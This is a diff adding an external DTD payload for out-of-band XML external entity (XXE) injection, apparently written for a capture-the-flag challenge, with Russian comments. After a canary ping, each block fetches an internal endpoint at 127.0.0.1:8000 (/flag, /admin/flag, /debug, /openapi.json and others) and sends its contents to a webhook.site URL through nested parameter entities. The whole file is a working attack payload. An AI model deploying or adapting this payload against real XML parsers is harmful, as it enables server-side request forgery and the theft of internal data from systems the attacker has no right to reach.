@@ -1,0 +1,70 @@
+<!-- Канарейка: просто проверь, что DTD реально подгрузился -->
+<!ENTITY % ping "<!ENTITY &#x25; hit SYSTEM 'https://webhook.site/<UUID>?d=PING'>">
+%ping;
+%hit;
+
+<!-- Цели на внутреннем сервисе 127.0.0.1:8000 -->
+<!ENTITY % u0  SYSTEM "http://127.0.0.1:8000/">
+<!ENTITY % e0  "<!ENTITY &#x25; x0 SYSTEM 'https://webhook.site/<UUID>?d=%u0;'>">
+%e0;
+%x0;
+
+<!ENTITY % u1  SYSTEM "http://127.0.0.1:8000/flag">
+<!ENTITY % e1  "<!ENTITY &#x25; x1 SYSTEM 'https://webhook.site/<UUID>?d=%u1;'>">
+%e1;
+%x1;
+
+<!ENTITY % u2  SYSTEM "http://127.0.0.1:8000/fl4g">
+<!ENTITY % e2  "<!ENTITY &#x25; x2 SYSTEM 'https://webhook.site/<UUID>?d=%u2;'>">
+%e2;
+%x2;
+
+<!ENTITY % u3  SYSTEM "http://127.0.0.1:8000/admin/flag">
+<!ENTITY % e3  "<!ENTITY &#x25; x3 SYSTEM 'https://webhook.site/<UUID>?d=%u3;'>">
+%e3;
+%x3;
+
+<!ENTITY % u4  SYSTEM "http://127.0.0.1:8000/api/flag">
+<!ENTITY % e4  "<!ENTITY &#x25; x4 SYSTEM 'https://webhook.site/<UUID>?d=%u4;'>">
+%e4;
+%x4;
+
+<!ENTITY % u5  SYSTEM "http://127.0.0.1:8000/internal/flag">
+<!ENTITY % e5  "<!ENTITY &#x25; x5 SYSTEM 'https://webhook.site/<UUID>?d=%u5;'>">
+%e5;
+%x5;
+
+<!ENTITY % u6  SYSTEM "http://127.0.0.1:8000/debug">
+<!ENTITY % e6  "<!ENTITY &#x25; x6 SYSTEM 'https://webhook.site/<UUID>?d=%u6;'>">
+%e6;
+%x6;
+
+<!ENTITY % u7  SYSTEM "http://127.0.0.1:8000/metrics">
+<!ENTITY % e7  "<!ENTITY &#x25; x7 SYSTEM 'https://webhook.site/<UUID>?d=%u7;'>">
+%e7;
+%x7;
+
+<!ENTITY % u8  SYSTEM "http://127.0.0.1:8000/health">
+<!ENTITY % e8  "<!ENTITY &#x25; x8 SYSTEM 'https://webhook.site/<UUID>?d=%u8;'>">
+%e8;
+%x8;
+
+<!ENTITY % u9  SYSTEM "http://127.0.0.1:8000/robots.txt">
+<!ENTITY % e9  "<!ENTITY &#x25; x9 SYSTEM 'https://webhook.site/<UUID>?d=%u9;'>">
+%e9;
+%x9;
+
+<!ENTITY % ua  SYSTEM "http://127.0.0.1:8000/openapi.json">
+<!ENTITY % ea  "<!ENTITY &#x25; xa SYSTEM 'https://webhook.site/<UUID>?d=%ua;'>">
+%ea;
+%xa;
+
+<!ENTITY % ub  SYSTEM "http://127.0.0.1:8000/docs">
+<!ENTITY % eb  "<!ENTITY &#x25; xb SYSTEM 'https://webhook.site/<UUID>?d=%ub;'>">
+%eb;
+%xb;
+
+<!ENTITY % uc  SYSTEM "http://127.0.0.1:8000/redoc">
+<!ENTITY % ec  "<!ENTITY &#x25; xc SYSTEM 'https://webhook.site/<UUID>?d=%uc;'>">
+%ec;
+%xc;
